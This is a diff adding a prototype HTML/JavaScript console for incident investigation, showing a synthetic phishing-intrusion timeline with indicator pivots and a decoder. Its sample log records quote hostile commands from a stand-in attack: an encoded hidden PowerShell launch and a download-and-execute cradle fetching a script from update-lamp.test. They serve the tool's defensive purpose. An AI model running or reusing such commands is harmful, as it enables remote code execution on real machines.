@@ -1,0 +1,207 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Osintrix POC C · Console</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Martian+Mono:wdth,wght@87.5,300..600&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#232529;--pane:#2B2E33;--hi:#34383E;--rule:#3D4249;--text:#E6E3DB;--dim:#9A9C9F;--faint:#6E7176;
+ --ip:#86B6FF;--domain:#C7A8FF;--hash:#F2A65A;--email:#74D4BB;--user:#F48FA9;--url:#E3D27A;--wallet:#9FD86B;--mal:#FF6E64;--cursor:#F2A65A;
+ --mono:'Martian Mono',ui-monospace,monospace}
+:root[data-theme=light]{--bg:#F4F3EE;--pane:#FFFFFF;--hi:#ECEAE3;--rule:#D8D5CC;--text:#24262A;--dim:#5E6166;--faint:#8D9095;
+ --ip:#1F5FCC;--domain:#7340C9;--hash:#B05A00;--email:#00806A;--user:#C22D5B;--url:#8A7300;--wallet:#3F7F12;--mal:#C8241A;--cursor:#B05A00}
+*{box-sizing:border-box}
+html,body{margin:0;height:100%}
+body{background:var(--bg);color:var(--text);font:400 12.5px/1.6 var(--mono);font-stretch:87.5%;display:grid;grid-template-rows:auto 1fr auto;-webkit-font-smoothing:antialiased}
+button{font:inherit;color:inherit;background:none;border:0;cursor:pointer;padding:0}
+:focus-visible{outline:1px solid var(--cursor);outline-offset:1px}
+/* command line */
+.cmd{padding:12px 16px 0;position:relative}
+.line{display:flex;align-items:center;gap:10px;background:var(--pane);border:1px solid var(--rule);padding:10px 12px}
+.line:focus-within{border-color:var(--cursor)}
+.prompt{color:var(--cursor);font-weight:600}
+.line input{flex:1;background:none;border:0;outline:none;color:var(--text);font:inherit;font-size:14px}
+.ctx{color:var(--dim)}
+.suggest{position:absolute;left:16px;right:16px;top:100%;background:var(--pane);border:1px solid var(--rule);border-top:0;z-index:5;display:none}
+.suggest.on{display:block}
+.suggest button{display:grid;grid-template-columns:260px 1fr;width:100%;text-align:left;padding:6px 12px;gap:14px}
+.suggest button[aria-selected=true]{background:var(--hi)}
+.suggest span{color:var(--dim)}
+.parsed{display:flex;gap:6px;padding:8px 2px 10px;color:var(--dim);flex-wrap:wrap;min-height:38px}
+.tok{border:1px solid var(--rule);padding:0 7px}
+.tok b{color:var(--cursor);font-weight:500}
+/* panes */
+.panes{display:grid;grid-template-columns:minmax(0,1.35fr) minmax(0,1fr);gap:0;margin:0 16px;border:1px solid var(--rule);min-height:0}
+.pane{background:var(--pane);min-height:0;display:flex;flex-direction:column}
+.pane+.pane{border-left:1px solid var(--rule)}
+.ph{display:flex;gap:0;border-bottom:1px solid var(--rule);color:var(--dim);flex:none}
+.ph button,.ph span{padding:6px 12px;border-right:1px solid var(--rule)}
+.ph button[aria-selected=true]{color:var(--text);background:var(--hi);box-shadow:inset 0 -2px 0 var(--cursor)}
+.ph .r{margin-left:auto;border-right:0;border-left:1px solid var(--rule)}
+.scroll{overflow:auto;flex:1}
+table{width:100%;border-collapse:collapse}
+td,th{padding:4px 10px;text-align:left;white-space:nowrap;vertical-align:top}
+th{color:var(--faint);font-weight:400;position:sticky;top:0;background:var(--pane);border-bottom:1px solid var(--rule)}
+tr.row{cursor:pointer}
+tr.row:hover{background:var(--hi)}
+tr.row[aria-selected=true]{background:var(--hi);box-shadow:inset 2px 0 0 var(--cursor)}
+td.t{color:var(--dim)} td.h{color:var(--dim)}
+td.title{white-space:normal;min-width:240px}
+.mal{color:var(--mal)}
+.k-ip{color:var(--ip)}.k-domain{color:var(--domain)}.k-hash{color:var(--hash)}.k-email{color:var(--email)}.k-user,.k-handle{color:var(--user)}.k-url{color:var(--url)}.k-wallet{color:var(--wallet)}.k-file{color:var(--hash)}
+.ioc{cursor:pointer;text-decoration:underline;text-decoration-color:color-mix(in srgb,currentColor 40%,transparent);text-underline-offset:3px}
+.ioc.v-malicious{text-decoration-style:wavy;text-decoration-color:var(--mal)}
+.detail{padding:12px 14px}
+.detail h2{font-size:13px;font-weight:600;margin:0 0 2px}
+.detail .meta{color:var(--dim);margin-bottom:10px}
+.raw{white-space:pre-wrap;word-break:break-word;background:var(--bg);border:1px solid var(--rule);padding:10px;margin:0}
+.kv{display:grid;grid-template-columns:110px 1fr;gap:2px 12px;margin:12px 0}
+.kv dt{color:var(--faint)} .kv dd{margin:0;word-break:break-all}
+.sec{color:var(--faint);margin:14px 0 4px}
+.pv{display:flex;flex-wrap:wrap;gap:6px}
+.pv button{border:1px solid var(--rule);padding:2px 8px}
+.pv button:hover{border-color:var(--cursor);color:var(--cursor)}
+.out{color:var(--dim)}
+.out b{color:var(--text);font-weight:500}
+/* status line */
+.status{display:flex;gap:0;margin:0 16px 12px;border:1px solid var(--rule);border-top:0;background:var(--pane);color:var(--dim);flex-wrap:wrap}
+.status span{padding:4px 12px;border-right:1px solid var(--rule)}
+.status .case{background:var(--cursor);color:#1E1A14;font-weight:600}
+.status .r{margin-left:auto;border-left:1px solid var(--rule)}
+.legend span{padding:4px 6px;border:0}
+@media (max-width:900px){.panes{grid-template-columns:1fr;grid-template-rows:1fr 1fr}.pane+.pane{border-left:0;border-top:1px solid var(--rule)}td.h,th.h,td.s,th.s{display:none}.suggest button{grid-template-columns:1fr}.legend{display:none}}
+</style>
+</head>
+<body>
+<div class="cmd">
+  <div class="line"><span class="prompt">lantern ›</span><input id="in" autocomplete="off" spellcheck="false" aria-label="Command" value="host:WS-FIN-07 tag:c2"><span class="ctx">Tab to complete · Enter to run</span></div>
+  <div class="suggest" id="sug" role="listbox"></div>
+  <div class="parsed" id="parsed"></div>
+</div>
+<div class="panes">
+  <section class="pane" aria-label="Results">
+    <div class="ph" role="tablist"><button role="tab" aria-selected="true">timeline</button><button role="tab" aria-selected="false">entities 31</button><button role="tab" aria-selected="false">graph</button><button role="tab" aria-selected="false">report</button><span class="r" id="count"></span></div>
+    <div class="scroll"><table><thead><tr><th>time (UTC)</th><th class="h">host</th><th class="s">source</th><th>event</th></tr></thead><tbody id="rows"></tbody></table></div>
+  </section>
+  <section class="pane" aria-label="Detail">
+    <div class="ph" role="tablist"><button role="tab" aria-selected="true" id="dTab">record</button><button role="tab" aria-selected="false">±5 min</button><button role="tab" aria-selected="false">notes</button></div>
+    <div class="scroll" id="detail"></div>
+  </section>
+</div>
+<div class="status">
+  <span class="case">TN-2026-014 Op Lantern</span><span id="nrec"></span><span class="mal">6 malicious</span><span>3 open questions</span>
+  <span class="legend"><span class="k-ip">ip</span><span class="k-domain">domain</span><span class="k-email">email</span><span class="k-hash">hash</span><span class="k-user">user</span><span class="k-url">url</span><span class="k-wallet">wallet</span></span>
+  <span class="r">encrypted · saved 2s ago</span><button style="padding:4px 12px;border-left:1px solid var(--rule)" id="theme">theme</button>
+</div>
+<script>
+/* Op Lantern sample data — taken from the OSINTrix demo case (synthetic, RFC 5737 / RFC 2606 ranges). */
+const CASES=[
+ {id:'c-lantern',code:'TN-2026-014',name:'Op Lantern',sub:'Invoice LNK intrusion',status:'Active',recs:27,ents:18,mal:6,open:3,upd:'15 Sep, 11:20'},
+ {id:'c-portal',code:'TN-2026-011',name:'Customer portal',sub:'Credential stuffing',status:'In review',recs:5,ents:3,mal:1,open:0,upd:'12 Sep, 16:05'},
+ {id:'c-lab',code:'LAB-2026-01',name:'Harbour photo',sub:'OSINT & forensics CTF lab',status:'Active',recs:8,ents:5,mal:0,open:2,upd:'21 Sep, 09:30'}];
+const RECS=[
+ {id:'r-mail',t:'2026-09-14 08:52:10',host:'MX01',src:'mail-gateway',title:'Invoice email delivered to finance',tag:'initial-access',body:'From: billing@lantern-invoice.example  To: j.okafor@corp.example  Subject: Invoice 4471 overdue  Attachment: Invoice_4471.pdf.lnk (1.9 KB)'},
+ {id:'r-lnk',t:'2026-09-14 08:57:33',host:'WS-FIN-07',src:'sysmon',title:'LNK opened, cmd spawns encoded PowerShell',tag:'execution',body:'EventID 1 ParentImage=C:\\Windows\\explorer.exe Image=C:\\Windows\\System32\\cmd.exe CommandLine="cmd.exe /c powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A…" from Invoice_4471.pdf.lnk'},
+ {id:'r-ps',t:'2026-09-14 08:57:35',host:'WS-FIN-07',src:'powershell',title:'Script block downloads second stage',tag:'execution',body:"EventID 4104 ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://update-lamp.test/s.ps1')"},
+ {id:'r-dns',t:'2026-09-14 08:57:41',host:'WS-FIN-07',src:'sysmon',title:'DNS: update-lamp.test resolves',tag:'c2',body:'EventID 22 QueryName=update-lamp.test QueryResults=198.51.100.23 Image=powershell.exe'},
+ {id:'r-drop',t:'2026-09-14 08:58:02',host:'WS-FIN-07',src:'sysmon',title:'svchost.exe dropped in Public folder',tag:'payload',body:'EventID 11 TargetFilename=C:\\Users\\Public\\svchost.exe SHA256=9f2c1d0b7e4a6c8f3b5d2e1a0c9b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a'},
+ {id:'r-c2a',t:'2026-09-14 08:58:15',host:'WS-FIN-07',src:'sysmon',title:'Outbound connection to 203.0.113.47:4444',tag:'c2',body:'EventID 3 Image=C:\\Users\\Public\\svchost.exe DestinationIp=203.0.113.47 DestinationPort=4444'},
+ {id:'r-c2e',t:'2026-09-14 09:02:15',host:'FW-EDGE',src:'firewall',title:'Beacon to 203.0.113.47:4444 (6 KB)',tag:'c2',body:'allow tcp 10.20.4.17:51052 -> 203.0.113.47:4444 bytes=6120'},
+ {id:'r-task',t:'2026-09-14 09:05:40',host:'WS-FIN-07',src:'security',title:'Scheduled task "OneDriveUpdate" created',tag:'persistence',body:'EventID 4698 TaskName=\\OneDriveUpdate Command=C:\\Users\\Public\\svchost.exe SubjectUserName=CORP\\j.okafor'},
+ {id:'r-lat',t:'2026-09-14 14:31:22',host:'DC01',src:'security',title:'Network logon to DC01 as svc_backup',tag:'lateral-movement',body:'EventID 4624 LogonType=3 TargetUserName=CORP\\svc_backup IpAddress=10.20.4.17 WorkstationName=WS-FIN-07'},
+ {id:'r-clear',t:'2026-09-14 14:40:55',host:'DC01',src:'security',title:'Security log cleared on DC01',tag:'anti-forensics',body:'EventID 1102 The audit log was cleared. SubjectUserName=CORP\\svc_backup'},
+ {id:'r-whois',t:'2026-09-15 10:20:00',host:'',src:'osint:whois',title:'Sender domain registered 13 days before the email',tag:'osint',body:'lantern-invoice.example registered 2026-09-01 via Example Registrar Inc.; registrant email n1ghtlamp@mail.example (privacy proxy not used).'},
+ {id:'r-forum',t:'2026-09-15 10:34:00',host:'',src:'osint:forum',title:'Handle @n1ghtlamp sells "lamp loader" on forum.example',tag:'osint',body:'Profile of @n1ghtlamp on forum.example (joined 2025-11) advertises a "lamp loader" builder; contact listed as n1ghtlamp@mail.example.'},
+ {id:'r-wallet',t:'2026-09-15 10:52:00',host:'',src:'osint:forum',title:'Forum post lists a BTC payment address',tag:'osint',body:'Pricing post by @n1ghtlamp: payment to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh only.'}];
+/* indicator -> kind, verdict, cross-case sightings */
+const IOC={
+ 'billing@lantern-invoice.example':{k:'email',v:'malicious'},
+ 'j.okafor@corp.example':{k:'email',v:'victim'},
+ 'Invoice_4471.pdf.lnk':{k:'file',v:'malicious'},
+ 'update-lamp.test':{k:'domain',v:'malicious'},
+ 'http://update-lamp.test/s.ps1':{k:'url',v:'malicious'},
+ '198.51.100.23':{k:'ip',v:'malicious'},
+ '9f2c1d0b7e4a6c8f3b5d2e1a0c9b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a':{k:'hash',v:'malicious'},
+ '203.0.113.47':{k:'ip',v:'malicious',x:['Customer portal — 212 failed logins, 10 Sep']},
+ '10.20.4.17':{k:'ip',v:'internal'},
+ 'svc_backup':{k:'user',v:'suspicious'},
+ 'lantern-invoice.example':{k:'domain',v:'malicious'},
+ 'n1ghtlamp@mail.example':{k:'email',v:'unrated'},
+ '@n1ghtlamp':{k:'handle',v:'unrated'},
+ 'forum.example':{k:'domain',v:'unrated'},
+ 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh':{k:'wallet',v:'unrated'}};
+const QUESTIONS=[['What was the initial access vector?',1],['Which account moved laterally to DC01?',1],['Does 198.51.100.23 host other domains?',0],['Who operates @n1ghtlamp?',0],['Was anything exfiltrated in the 6 KB beacon?',0]];
+const PIVOTS={ip:['VirusTotal','AbuseIPDB','Shodan','Censys','GreyNoise'],domain:['VirusTotal','urlscan','crt.sh','SecurityTrails'],email:['Have I Been Pwned','Hunter','Epieos'],hash:['VirusTotal','MalwareBazaar','Hybrid Analysis'],url:['urlscan','VirusTotal'],wallet:['Blockchair','OXT'],handle:['WhatsMyName','Sherlock'],user:['Search evidence'],file:['Search evidence']};
+function sightings(ioc){return RECS.filter(r=>(r.body+' '+r.title).includes(ioc)).map(r=>r.id);}
+function markup(text,esc){ // wrap known indicators, longest first
+  const keys=Object.keys(IOC).sort((a,b)=>b.length-a.length);
+  let out='',i=0;
+  while(i<text.length){let hit=null;for(const k of keys){if(text.startsWith(k,i)){hit=k;break}}
+    if(hit){out+=`<mark class="ioc v-${IOC[hit].v}" data-ioc="${esc(hit)}" tabindex="0">${esc(hit)}</mark>`;i+=hit.length}else{out+=esc(text[i]);i++}}
+  return out;}
+const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+
+const $=id=>document.getElementById(id);
+const CMDS=[
+ ['host:WS-FIN-07','filter to one host'],['tag:c2','filter by tag'],['verdict:malicious','records that mention malicious indicators'],['after:2026-09-14T09:00','records after a time'],
+ ['pivot 203.0.113.47','everything about one indicator'],['set 203.0.113.47 malicious','record a verdict'],['decode SQBFAFgAIAAoAE4AZQB3AC0A','peel Base64, hex, gzip and more'],
+ ['capture','paste evidence into this case'],['open toolbox','jump to another area'],['case portal','switch case']];
+let sel='r-c2a', active=-1;
+function hl(text){return markup(text,esc).replace(/<mark class="ioc v-(\w+)" data-ioc="([^"]+)" tabindex="0">/g,(m,v,k)=>`<span class="ioc k-${IOC[k.replace(/&amp;/g,'&')]?.k||'ip'} v-${v}" data-ioc="${k}" tabindex="0">`).replace(/<\/mark>/g,'</span>')}
+function parse(q){const toks=q.trim().split(/\s+/).filter(Boolean);const f={};toks.forEach(t=>{const m=t.match(/^(\w+):(.+)$/);if(m)f[m[1]]=m[2]});return {toks,f}}
+function run(){
+  const q=$('in').value; const {toks,f}=parse(q);
+  $('parsed').innerHTML=toks.length?toks.map(t=>{const m=t.match(/^(\w+):(.+)$/);return `<span class="tok">${m?`<b>${esc(m[1])}</b> = ${esc(m[2])}`:esc(t)}</span>`}).join('')+`<span>→ ${describe(toks,f)}</span>`:'<span>Type a filter like host:DC01, or a command like pivot 203.0.113.47</span>';
+  if(toks[0]==='pivot'&&toks[1]) return pivot(toks[1]);
+  if(toks[0]==='decode'&&toks[1]) return decode(toks[1]);
+  const rows=RECS.filter(r=>(!f.host||r.host.toLowerCase()===f.host.toLowerCase())&&(!f.tag||r.tag.includes(f.tag))&&(!f.verdict||Object.keys(IOC).some(k=>IOC[k].v===f.verdict&&r.body.includes(k)))&&(!f.after||r.t.replace(' ','T')>=f.after)&&
+    (toks.filter(t=>!t.includes(':')).every(t=>(r.title+r.body).toLowerCase().includes(t.toLowerCase()))));
+  table(rows);
+}
+function describe(t,f){if(t[0]==='pivot')return 'show every record, link and lookup for one indicator';if(t[0]==='decode')return 'auto-decode';return 'filter the timeline'}
+function table(rows){
+  $('count').textContent=rows.length+' of '+RECS.length;
+  $('rows').innerHTML=rows.map(r=>`<tr class="row" data-id="${r.id}" aria-selected="${r.id===sel}" tabindex="0"><td class="t">${r.t.slice(5,16)}</td><td class="h">${esc(r.host||'—')}</td><td class="s">${esc(r.src)}</td><td class="title">${hl(r.title)}</td></tr>`).join('')||`<tr><td colspan="4" class="out">No records match. Remove a filter, or try verdict:malicious.</td></tr>`;
+  if(!rows.find(r=>r.id===sel)&&rows[0]) sel=rows[0].id;
+  detail();
+}
+function detail(){const r=RECS.find(x=>x.id===sel); if(!r){$('detail').innerHTML='';return}
+  const fields=[...r.body.matchAll(/(\w+)=("[^"]*"|\S+)/g)].slice(0,8);
+  $('detail').innerHTML=`<div class="detail"><h2>${hl(r.title)}</h2><div class="meta">${r.t} UTC · ${esc(r.host||'no host')} · ${esc(r.src)} · #${esc(r.tag)}</div>
+   <pre class="raw">${hl(r.body)}</pre>
+   ${fields.length?`<div class="sec">parsed fields</div><dl class="kv">${fields.map(([,k,v])=>`<dt>${esc(k)}</dt><dd>${hl(v)}</dd>`).join('')}</dl>`:''}
+   <div class="sec">try</div><div class="pv">${Object.keys(IOC).filter(k=>r.body.includes(k)).slice(0,3).map(k=>`<button data-run="pivot ${esc(k)}">pivot ${esc(k.length>24?k.slice(0,22)+'…':k)}</button>`).join('')}<button data-run="after:${r.t.replace(' ','T').slice(0,16)}">after this</button></div></div>`;
+}
+function pivot(k){const i=IOC[k]; if(!i){$('detail').innerHTML=`<div class="detail out">${esc(k)} is not in this case yet. <b>capture</b> evidence that mentions it, or check another case with <b>case</b>.</div>`;return}
+  const rs=RECS.filter(r=>(r.body+r.title).includes(k)); table(rs);
+  $('detail').innerHTML=`<div class="detail"><h2 class="k-${i.k}">${esc(k)}</h2><div class="meta">${i.k} · <span class="${i.v==='malicious'?'mal':''}">${i.v}</span> · in ${rs.length} records</div>
+   ${i.x?`<p class="mal">also in another case: ${esc(i.x[0])}</p>`:''}
+   <div class="sec">look up (opens a new tab)</div><div class="pv">${(PIVOTS[i.k]||[]).map(p=>`<button>${p}</button>`).join('')}</div>
+   <div class="sec">next</div><div class="pv"><button data-run="set ${esc(k)} benign">set benign</button><button>watch</button><button>add to graph</button><button>copy defanged</button></div></div>`;}
+function decode(s){let out=s; try{out=atob(s.replace(/…$/,'')).replace(/\0/g,'')}catch(e){}
+  $('detail').innerHTML=`<div class="detail"><h2>decode</h2><div class="meta">base64 → utf-16le (1 layer found)</div><pre class="raw">${esc(out)}…</pre><div class="sec">next</div><div class="pv"><button>save to record r-lnk</button><button>copy</button></div></div>`;}
+function suggest(){const v=$('in').value.split(/\s+/).pop().toLowerCase(); const list=CMDS.filter(([c])=>c.toLowerCase().startsWith(v)&&v.length>0).slice(0,6);
+  $('sug').innerHTML=list.map(([c,d],i)=>`<button role="option" aria-selected="${i===active}" data-c="${esc(c)}">${esc(c)}<span>${esc(d)}</span></button>`).join(''); $('sug').classList.toggle('on',list.length>0&&document.activeElement===$('in'));}
+$('in').addEventListener('input',()=>{active=-1;suggest();run()});
+$('in').addEventListener('focus',suggest);
+$('in').addEventListener('blur',()=>setTimeout(()=>$('sug').classList.remove('on'),150));
+$('in').addEventListener('keydown',e=>{const opts=[...$('sug').querySelectorAll('button')];
+  if(e.key==='ArrowDown'&&opts.length){e.preventDefault();active=(active+1)%opts.length;suggest()}
+  else if((e.key==='Tab'||e.key==='Enter')&&active>=0&&opts[active]){e.preventDefault();accept(opts[active].dataset.c)}
+  else if(e.key==='Enter'){$('sug').classList.remove('on');run()}});
+function accept(c){const parts=$('in').value.split(/\s+/);parts[parts.length-1]=c;$('in').value=parts.join(' ')+' ';active=-1;suggest();run()}
+document.addEventListener('mousedown',e=>{const b=e.target.closest('[data-c]');if(b){e.preventDefault();accept(b.dataset.c)}});
+document.addEventListener('click',e=>{
+  const io=e.target.closest('[data-ioc]'); if(io){$('in').value='pivot '+io.dataset.ioc.replace(/&amp;/g,'&');run();return}
+  const r=e.target.closest('tr.row'); if(r){sel=r.dataset.id;document.querySelectorAll('tr.row').forEach(x=>x.setAttribute('aria-selected',x.dataset.id===sel));detail();return}
+  const ru=e.target.closest('[data-run]'); if(ru){$('in').value=ru.dataset.run;run()}
+});
+document.addEventListener('keydown',e=>{if(e.target===$('in'))return; if(e.key==='/'||e.key===':'){e.preventDefault();$('in').focus();$('in').select()}
+  if(e.key==='j'||e.key==='k'){const rows=[...document.querySelectorAll('tr.row')];const i=rows.findIndex(x=>x.dataset.id===sel);const n=rows[Math.max(0,Math.min(rows.length-1,i+(e.key==='j'?1:-1)))];if(n)n.click()}});
+$('theme').onclick=()=>{const h=document.documentElement;h.dataset.theme=h.dataset.theme==='light'?'dark':'light'};
+document.getElementById("nrec").textContent=RECS.length+" records (sample)";run();
+</script>
+</body>
+</html>
